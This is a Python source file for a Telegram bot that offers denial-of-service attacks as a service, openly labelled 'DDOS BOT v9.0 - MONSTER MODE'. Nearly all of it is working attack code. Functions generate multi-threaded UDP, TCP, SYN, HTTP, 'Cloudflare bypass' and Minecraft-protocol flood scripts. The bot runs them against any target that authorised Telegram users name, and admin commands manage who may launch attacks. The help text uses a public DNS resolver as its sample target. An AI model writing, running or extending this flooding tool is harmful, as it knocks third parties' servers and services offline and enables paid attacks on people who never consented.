"""
💀 DDOS BOT v9.0 - MONSTER MODE 💀
GitHub Codespaces Ready
Features: TUDP, Minecraft Attacks, UDP, TCP, SYN, HTTP, UDP Bypass, TCP Bypass, Cloudflare, GUDP, Mixed, Ping, TCP Ping
"""

import telebot
import subprocess
import datetime
import os
import threading
import time
import random
import socket
import sys
import re
import urllib.request
import json
import struct

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = os.getenv("ADMIN_IDS", "8908646607").split(",")
USER_FILE = "users.txt"
LOG_FILE = "logs.txt"

allowed_users = []
running_attacks = {}
attack_status = {}
cooldowns = {}
bot = telebot.TeleBot(BOT_TOKEN)
lock = threading.Lock()

# ========== IP RESOLVER ==========

def resolve_ip(host):
    try:
        host = re.sub(r'^https?://', '', host)
        host = host.split('/')[0]
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', host):
            return host
        ip = socket.gethostbyname(host)
        return ip
    except:
        return None

def get_domain_info(host):
    try:
        host = re.sub(r'^https?://', '', host)
        host = host.split('/')[0]
        info = {}
        ip = resolve_ip(host)
        if ip:
            info['ip'] = ip
        try:
            result = subprocess.getoutput(f"whois {host} 2>/dev/null | grep -E 'Registrar|Creation|Expiry|Name Server' | head -5")
            info['whois'] = result if result else "Not available"
        except:
            info['whois'] = "Not available"
        try:
            import ssl
            ctx = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    info['ssl'] = cert.get('notAfter', 'N/A')
        except:
            info['ssl'] = "Not available"
        return info
    except:
        return None

# ========== PING FUNCTIONS ==========

def ping_host(host, count=4):
    try:
        result = subprocess.getoutput(f"ping -c {count} {host} 2>/dev/null")
        if "100% packet loss" in result:
            return {"status": "DOWN", "output": result}
        lines = result.split('\n')
        stats = {}
        for line in lines:
            if "packets transmitted" in line:
                parts = line.split(',')
                stats['transmitted'] = parts[0].strip().split()[0]
                stats['received'] = parts[1].strip().split()[0] if len(parts) > 1 else '0'
                stats['loss'] = parts[2].strip().split()[0] if len(parts) > 2 else '100%'
            if "rtt min/avg/max/mdev" in line:
                parts = line.split('=')
                if len(parts) > 1:
                    values = parts[1].split('/')
                    stats['min'] = values[0].strip() + ' ms'
                    stats['avg'] = values[1].strip() + ' ms'
                    stats['max'] = values[2].strip() + ' ms'
        stats['status'] = "ONLINE"
        stats['output'] = result
        return stats
    except:
        return {"status": "ERROR", "output": str(sys.exc_info()[1])}

def tcp_ping(host, port=80, timeout=3):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        start = time.time()
        result = sock.connect_ex((host, port))
        end = time.time()
        sock.close()
        if result == 0:
            return {"status": "OPEN", "latency": f"{(end-start)*1000:.2f}ms", "port": port}
        else:
            return {"status": "CLOSED", "port": port}
    except:
        return {"status": "ERROR", "port": port}

# ========== MONSTER ATTACK FUNCTIONS ==========

def create_tudp_attack(target, port, duration, threads=1500):
    """TUDP - Monster UDP Flood (SIRISAKz Style)"""
    return f"""python3 -c "
import random, socket, threading, time, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
thr = 0
def flood():
    global thr
    data = random._urandom(1200)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (target, port)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                s.sendto(data, addr)
                s.sendto(data, addr)
                s.sendto(data, addr)
                s.sendto(data, addr)
                s.sendto(data, addr)
                count += 5
                if count % 1000 == 0:
                    sys.stderr.write(f'TUDP: {{count}} packets sent\\n')
            except:
                pass
        s.close()
        sys.stderr.write(f'TUDP completed: {{count}} packets\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_minecraft_attack(target, port, duration, threads=1000):
    """Minecraft Attack - UDP Flood with Minecraft packet spoofing"""
    return f"""python3 -c "
import random, socket, threading, time, sys, struct
target='{target}'; port={port}; duration={duration}; threads={threads}
def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                # Minecraft server ping packet
                packet = b'\\x00\\x00\\x00\\x00' + random._urandom(64)
                s.sendto(packet, (target, port))
                # Another variant
                packet2 = b'\\xFE\\x01' + random._urandom(32)
                s.sendto(packet2, (target, port))
                # Large packet
                packet3 = random._urandom(2048)
                s.sendto(packet3, (target, port))
                count += 3
                if count % 1000 == 0:
                    sys.stderr.write(f'MC: {{count}} packets sent\\n')
            except:
                pass
        s.close()
        sys.stderr.write(f'MC attack completed: {{count}} packets\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_minecraft_query_attack(target, port, duration, threads=800):
    """Minecraft Query Attack - Full query flood"""
    return f"""python3 -c "
import random, socket, threading, time, sys, struct
target='{target}'; port={port}; duration={duration}; threads={threads}
def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                # Minecraft Query packet
                packet = b'\\xFE\\xFD\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' + random._urandom(32)
                s.sendto(packet, (target, port))
                # Another query variant
                packet2 = b'\\xFE\\xFD\\x09' + random._urandom(16)
                s.sendto(packet2, (target, port))
                count += 2
                if count % 1000 == 0:
                    sys.stderr.write(f'MC Query: {{count}} packets\\n')
            except:
                pass
        s.close()
        sys.stderr.write(f'MC Query completed: {{count}} packets\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_minecraft_handshake_attack(target, port, duration, threads=600):
    """Minecraft Handshake Attack - Spoof handshake packets"""
    return f"""python3 -c "
import random, socket, threading, time, sys, struct
target='{target}'; port={port}; duration={duration}; threads={threads}
def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                # Minecraft handshake packet
                packet = b'\\x10\\x00\\x00\\x00' + b'\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00' + b'localhost' + b'\\x00\\x00\\x00\\x00'
                s.connect_ex((target, port))
                s.sendto(packet, (target, port))
                count += 1
                if count % 1000 == 0:
                    sys.stderr.write(f'MC Handshake: {{count}} packets\\n')
            except:
                pass
        s.close()
        sys.stderr.write(f'MC Handshake completed: {{count}} packets\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_udp_attack(target, port, duration, threads=1500):
    return f"""python3 -c "
import socket, random, time, threading, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        payload = random._urandom(65507)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                s.sendto(payload, (target, port))
                count += 1
                if count % 10000 == 0:
                    sys.stderr.write(f'UDP: {{count}} packets\\n')
            except:
                pass
        s.close()
        sys.stderr.write(f'UDP completed: {{count}} packets\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_tcp_attack(target, port, duration, threads=1000):
    return f"""python3 -c "
import socket, random, time, threading, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.05)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                s.connect_ex((target, port))
                s.close()
                count += 1
                if count % 10000 == 0:
                    sys.stderr.write(f'TCP: {{count}} connections\\n')
            except: pass
        sys.stderr.write(f'TCP completed: {{count}} connections\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_syn_attack(target, port, duration, threads=800):
    return f"""python3 -c "
import socket, random, time, threading, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
def flood():
    try:
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.02)
                s.connect_ex((target, port))
                s.close()
                count += 1
                if count % 10000 == 0:
                    sys.stderr.write(f'SYN: {{count}} packets\\n')
            except: pass
        sys.stderr.write(f'SYN completed: {{count}} packets\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_http_attack(target, port, duration, threads=500):
    return f"""python3 -c "
import urllib.request, random, time, threading, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Googlebot/2.1']
def flood():
    end = time.time() + duration
    count = 0
    while time.time() < end:
        try:
            req = urllib.request.Request(f'http://{{target}}:{{port}}/')
            req.add_header('User-Agent', random.choice(ua))
            urllib.request.urlopen(req, timeout=1)
            count += 1
            if count % 1000 == 0:
                sys.stderr.write(f'HTTP: {{count}} requests\\n')
        except: pass
    sys.stderr.write(f'HTTP completed: {{count}} requests\\n')
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_udpbypass_attack(target, port, duration, threads=1200):
    return f"""python3 -c "
import socket, random, time, threading, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
ports = [53,80,443,8080,8443,123,161,389,3306]
def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                p = random._urandom(65507)
                s.sendto(p, (target, random.choice(ports)))
                s.sendto(p, (target, port))
                count += 2
                if count % 10000 == 0:
                    sys.stderr.write(f'UDP BYPASS: {{count}} packets\\n')
            except: pass
        s.close()
        sys.stderr.write(f'UDP BYPASS completed: {{count}} packets\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_tcpbypass_attack(target, port, duration, threads=800):
    return f"""python3 -c "
import socket, random, time, threading, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
def flood():
    try:
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('', random.randint(1024, 65535)))
                s.connect_ex((target, port))
                s.close()
                count += 1
                if count % 10000 == 0:
                    sys.stderr.write(f'TCP BYPASS: {{count}} connections\\n')
            except: pass
        sys.stderr.write(f'TCP BYPASS completed: {{count}} connections\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_cloudflare_attack(target, port, duration, threads=600):
    return f"""python3 -c "
import urllib.request, random, time, threading, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
]
paths = ['/', '/index.html', '/admin', '/api', '/login', '/search', '/products']
def flood():
    end = time.time() + duration
    count = 0
    while time.time() < end:
        try:
            url = f'http://{{target}}:{{port}}{random.choice(paths)}'
            req = urllib.request.Request(url)
            req.add_header('User-Agent', random.choice(ua))
            req.add_header('Accept', '*/*')
            req.add_header('Connection', 'keep-alive')
            urllib.request.urlopen(req, timeout=1)
            count += 1
            if count % 1000 == 0:
                sys.stderr.write(f'CF BYPASS: {{count}} requests\\n')
        except: pass
    sys.stderr.write(f'CF BYPASS completed: {{count}} requests\\n')
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_gudp_attack(target, port, duration, threads=1500):
    return f"""python3 -c "
import socket, random, time, threading, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                p = random._urandom(65507)
                s.sendto(p, (target, port))
                s.sendto(p, (target, random.randint(1, 65535)))
                count += 2
                if count % 10000 == 0:
                    sys.stderr.write(f'GUDP: {{count}} packets\\n')
            except: pass
        s.close()
        sys.stderr.write(f'GUDP completed: {{count}} packets\\n')
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_mixed_attack(target, port, duration, threads=1000):
    return f"""python3 -c "
import socket, random, time, threading, urllib.request, sys
target='{target}'; port={port}; duration={duration}; threads={threads}
def udp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    p = random._urandom(65507)
    end = time.time() + duration
    while time.time() < end:
        try: s.sendto(p, (target, port))
        except: pass
def tcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.05)
    end = time.time() + duration
    while time.time() < end:
        try: s.connect_ex((target, port)); s.close()
        except: pass
def http():
    end = time.time() + duration
    while time.time() < end:
        try: urllib.request.urlopen(f'http://{{target}}:{{port}}/', timeout=1)
        except: pass
t = threads//3
for i in range(t):
    threading.Thread(target=udp, daemon=True).start()
    threading.Thread(target=tcp, daemon=True).start()
    threading.Thread(target=http, daemon=True).start()
sys.stderr.write('MIXED attack started!\\n')
time.sleep(duration + 2)
sys.stderr.write('MIXED attack completed!\\n')
\" """

# ========== EXECUTION ==========

def execute_attack(user_id, attack_type, target, port, duration):
    if not 1 <= port <= 65535:
        return False, "Port must be 1-65535"
    if not 1 <= duration <= 600:
        return False, "Duration must be 1-600 seconds"

    attack_map = {
        'tudp': (create_tudp_attack, 1500),
        'mc': (create_minecraft_attack, 1000),
        'mcquery': (create_minecraft_query_attack, 800),
        'mchandshake': (create_minecraft_handshake_attack, 600),
        'udp': (create_udp_attack, 1500),
        'tcp': (create_tcp_attack, 1000),
        'syn': (create_syn_attack, 800),
        'http': (create_http_attack, 500),
        'udpbypass': (create_udpbypass_attack, 1200),
        'tcpbypass': (create_tcpbypass_attack, 800),
        'cf': (create_cloudflare_attack, 600),
        'gudp': (create_gudp_attack, 1500),
        'mixed': (create_mixed_attack, 1000),
    }

    if attack_type not in attack_map:
        return False, f"Unknown attack: {attack_type}"

    func, threads = attack_map[attack_type]

    try:
        cmd = func(target, port, duration, threads)
        temp_file = f"/tmp/attack_{int(time.time())}.py"
        with open(temp_file, "w") as f:
            f.write(cmd)
        os.chmod(temp_file, 0o755)

        process = subprocess.Popen(["python3", temp_file], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)

        with lock:
            if user_id not in running_attacks:
                running_attacks[user_id] = []
            running_attacks[user_id].append((process, temp_file, attack_type, target, port, duration, threads))

        return True, f"✅ {attack_type.upper()} attack started on {target}:{port} for {duration}s with {threads} threads"

    except Exception as e:
        return False, f"Error: {str(e)}"

def stop_user_attacks(user_id):
    with lock:
        if user_id not in running_attacks:
            return 0
        count = 0
        for process, temp_file, attack_type, target, port, duration, threads in running_attacks[user_id]:
            try:
                process.terminate()
                time.sleep(0.2)
                process.kill()
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                count += 1
            except:
                pass
        running_attacks[user_id] = []
        return count

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user(user_id):
    with open(USER_FILE, "a") as f:
        f.write(f"{user_id}\n")

# ========== TELEGRAM COMMANDS ==========

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, """💀 DDOS BOT v9.0 - MONSTER MODE 💀

🔥 MONSTER ATTACKS:
/tudp <target> <port> <time> - TUDP Monster Flood
/mc <target> <port> <time> - Minecraft Attack
/mcquery <target> <port> <time> - Minecraft Query
/mchandshake <target> <port> <time> - Minecraft Handshake
/udp <target> <port> <time> - UDP Flood
/tcp <target> <port> <time> - TCP Flood
/syn <target> <port> <time> - SYN Flood
/http <target> <port> <time> - HTTP Flood
/udpbypass <target> <port> <time> - UDP Bypass
/tcpbypass <target> <port> <time> - TCP Bypass
/cf <target> <port> <time> - Cloudflare Bypass
/gudp <target> <port> <time> - GUDP Flood
/mixed <target> <port> <time> - ALL Combined

🔍 TOOLS:
/ping <ip/domain> - Ping target
/tcpping <ip> <port> - TCP Ping
/resolve <domain> - Resolve IP & Info
/check - Check attack status

🛑 CONTROL:
/stopall - Stop your attacks
/status - Check attacks
/id - Get your ID

👑 Admin: /admin
Example: /tudp 8.8.8.8 53 60""")

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, """💀 MONSTER COMMANDS 💀

🔥 ATTACKS:
/tudp 1.2.3.4 80 60 - TUDP Monster
/mc 1.2.3.4 25565 60 - Minecraft Attack
/mcquery 1.2.3.4 25565 60 - Minecraft Query
/mchandshake 1.2.3.4 25565 60 - Minecraft Handshake
/udp 1.2.3.4 80 60 - UDP Flood
/tcp 1.2.3.4 80 60 - TCP Flood
/syn 1.2.3.4 80 60 - SYN Flood
/http 1.2.3.4 80 60 - HTTP Flood
/udpbypass 1.2.3.4 80 60 - UDP Bypass
/tcpbypass 1.2.3.4 80 60 - TCP Bypass
/cf 1.2.3.4 443 60 - Cloudflare Bypass
/gudp 1.2.3.4 80 60 - GUDP Flood
/mixed 1.2.3.4 80 60 - ALL Combined

🔍 TOOLS:
/ping google.com
/tcpping 1.2.3.4 80
/resolve google.com
/check - Check attack status

🛑 CONTROL:
/stopall
/status
/id

👑 ADMIN:
/admin""")

@bot.message_handler(commands=['ping'])
def ping_command(message):
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /ping <ip/domain>")
        return
    target = parts[1]
    msg = bot.reply_to(message, f"🏓 Pinging {target}...")
    ip = resolve_ip(target)
    if ip:
        result = ping_host(ip, 4)
        response = f"""📡 PING RESULTS 📡

Target: {target}
IP: {ip}
Status: {result.get('status', 'UNKNOWN')}

📊 Statistics:
Transmitted: {result.get('transmitted', 'N/A')}
Received: {result.get('received', 'N/A')}
Loss: {result.get('loss', 'N/A')}
Min: {result.get('min', 'N/A')}
Avg: {result.get('avg', 'N/A')}
Max: {result.get('max', 'N/A')}"""
    else:
        response = f"❌ Could not resolve {target}"
    bot.edit_message_text(response, chat_id=message.chat.id, message_id=msg.message_id)

@bot.message_handler(commands=['tcpping'])
def tcpping_command(message):
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /tcpping <ip> <port>")
        return
    target = parts[1]
    port = int(parts[2])
    msg = bot.reply_to(message, f"🔌 TCP Pinging {target}:{port}...")
    ip = resolve_ip(target)
    if not ip:
        bot.edit_message_text(f"❌ Could not resolve {target}", chat_id=message.chat.id, message_id=msg.message_id)
        return
    result = tcp_ping(ip, port)
    if result['status'] == 'OPEN':
        response = f"""✅ TCP Ping SUCCESS

Target: {target}
IP: {ip}
Port: {port}
Status: ✅ OPEN
Latency: {result.get('latency', 'N/A')}"""
    else:
        response = f"""❌ TCP Ping FAILED

Target: {target}
IP: {ip}
Port: {port}
Status: ❌ {result['status']}"""
    bot.edit_message_text(response, chat_id=message.chat.id, message_id=msg.message_id)

@bot.message_handler(commands=['resolve'])
def resolve_command(message):
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /resolve <domain>")
        return
    target = parts[1]
    msg = bot.reply_to(message, f"🔍 Resolving {target}...")
    ip = resolve_ip(target)
    if ip:
        info = get_domain_info(target)
        response = f"""🌐 DOMAIN INFO

Domain: {target}
IP: {ip}

📋 WHOIS:
{info.get('whois', 'N/A')[:200]}

🔒 SSL Expiry:
{info.get('ssl', 'N/A')}"""
    else:
        response = f"❌ Could not resolve {target}"
    bot.edit_message_text(response, chat_id=message.chat.id, message_id=msg.message_id)

@bot.message_handler(commands=['id'])
def id_command(message):
    bot.reply_to(message, f"Your ID: `{message.chat.id}`", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.chat.id)
    with lock:
        if user_id not in running_attacks or not running_attacks[user_id]:
            bot.reply_to(message, "📭 No active attacks")
            return
        attacks = running_attacks[user_id]
        msg = f"🔥 ACTIVE ATTACKS ({len(attacks)})\n\n"
        for i, (proc, temp_file, attack_type, target, port, duration, threads) in enumerate(attacks, 1):
            status = '🟢 Running' if proc.poll() is None else '🔴 Completed'
            msg += f"{i}. {attack_type.upper()} → {target}:{port}\n"
            msg += f"   ⏱️ Duration: {duration}s | 🧵 Threads: {threads}\n"
            msg += f"   📊 Status: {status}\n\n"
        bot.reply_to(message, msg)

@bot.message_handler(commands=['check'])
def check_command(message):
    """Check if attack is actually running"""
    user_id = str(message.chat.id)
    if user_id not in allowed_users and user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Not authorized")
        return
    
    # Check running attacks
    result = subprocess.getoutput("ps aux | grep -E 'attack_.*\.py' | grep -v grep")
    
    if result:
        response = f"🟢 ATTACK RUNNING!\n\n```\n{result[:500]}\n```"
    else:
        response = "🔴 No attack running"
    
    # Check network traffic
    traffic = subprocess.getoutput("netstat -an | grep -E 'ESTABLISHED|SYN_SENT' | head -5")
    if traffic and "ESTABLISHED" in traffic:
        response += f"\n\n📊 Network Connections:\n```\n{traffic}\n```"
    
    # Check temp files
    files = subprocess.getoutput("ls -la /tmp/attack_*.py 2>/dev/null")
    if files and "No such file" not in files:
        response += f"\n\n📁 Attack files found:\n```\n{files[:200]}\n```"
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['stopall'])
def stopall_command(message):
    user_id = str(message.chat.id)
    count = stop_user_attacks(user_id)
    bot.reply_to(message, f"✅ Stopped {count} attack(s)")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    bot.reply_to(message, """👑 ADMIN PANEL

/add <userid> - Add user
/remove <userid> - Remove user
/allusers - List users
/globalstop - Stop ALL
/status - Global stats""")

@bot.message_handler(commands=['add'])
def add_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /add <userid>")
        return
    new_user = parts[1]
    if new_user in allowed_users:
        bot.reply_to(message, f"User {new_user} already exists")
        return
    allowed_users.append(new_user)
    save_user(new_user)
    bot.reply_to(message, f"✅ User {new_user} added")

@bot.message_handler(commands=['remove'])
def remove_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /remove <userid>")
        return
    user_to_remove = parts[1]
    if user_to_remove not in allowed_users:
        bot.reply_to(message, f"User {user_to_remove} not found")
        return
    allowed_users = [u for u in allowed_users if u != user_to_remove]
    with open(USER_FILE, "w") as f:
        for u in allowed_users:
            f.write(f"{u}\n")
    bot.reply_to(message, f"✅ User {user_to_remove} removed")

@bot.message_handler(commands=['allusers'])
def allusers_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    if not allowed_users:
        bot.reply_to(message, "No users")
        return
    response = "👥 Users:\n"
    for uid in allowed_users:
        try:
            info = bot.get_chat(int(uid))
            username = f"@{info.username}" if info.username else "Unknown"
            response += f"• {username} (ID: {uid})\n"
        except:
            response += f"• ID: {uid}\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['globalstop'])
def globalstop_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    total = 0
    for uid in list(running_attacks.keys()):
        total += stop_user_attacks(uid)
    bot.reply_to(message, f"✅ Stopped {total} global attacks")

# ========== ATTACK HANDLER ==========

def make_handler(attack_type):
    def handler(message):
        user_id = str(message.chat.id)
        if user_id not in allowed_users and user_id not in ADMIN_IDS:
            bot.reply_to(message, "❌ Not authorized")
            return

        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, f"Usage: /{attack_type} <target> <port> <time>")
            return

        target = parts[1]
        try:
            port = int(parts[2])
            duration = int(parts[3])
        except:
            bot.reply_to(message, "❌ Port and time must be numbers")
            return

        # Show attack starting
        status_msg = bot.reply_to(message, f"""⚡ Starting {attack_type.upper()} Attack...

🎯 Target: {target}:{port}
⏱️ Duration: {duration}s
🔄 Status: Connecting...""")

        # Execute attack
        success, msg = execute_attack(user_id, attack_type, target, port, duration)

        if success:
            bot.edit_message_text(f"""✅ ATTACK STARTED! 🚀

Method: {attack_type.upper()}
Target: {target}:{port}
Duration: {duration}s
Threads: {msg.split('with ')[-1].split(' ')[0] if 'with ' in msg else 'N/A'}

📊 Status: 🟢 Running
📌 Use /status to monitor
🛑 Use /stopall to stop""", chat_id=message.chat.id, message_id=status_msg.message_id)
        else:
            bot.edit_message_text(f"❌ Attack Failed!\n\n{msg}", chat_id=message.chat.id, message_id=status_msg.message_id)

    return handler

# Register all attacks
attacks = ['tudp', 'mc', 'mcquery', 'mchandshake', 'udp', 'tcp', 'syn', 'http', 'udpbypass', 'tcpbypass', 'cf', 'gudp', 'mixed']
for attack in attacks:
    handler = make_handler(attack)
    handler.__name__ = f"handle_{attack}"
    setattr(sys.modules[__name__], handler.__name__, handler)
    bot.message_handler(commands=[attack])(handler)

# ========== MAIN ==========

if __name__ == "__main__":
    print("=" * 50)
    print("💀 DDOS BOT v9.0 - MONSTER MODE 💀")
    print("=" * 50)
    allowed_users = load_users()
    for admin in ADMIN_IDS:
        if admin not in allowed_users:
            allowed_users.append(admin)
            save_user(admin)
    print(f"[+] Loaded {len(allowed_users)} users")
    print(f"[+] Admin IDs: {ADMIN_IDS}")
    print(f"[+] Attack methods: {len(attacks)}")
    print(f"[+] Tools: Ping, TCP Ping, Resolver, Check")
    print("=" * 50)
    print("[+] Bot running! Press Ctrl+C to stop.")
    bot.polling(none_stop=True)
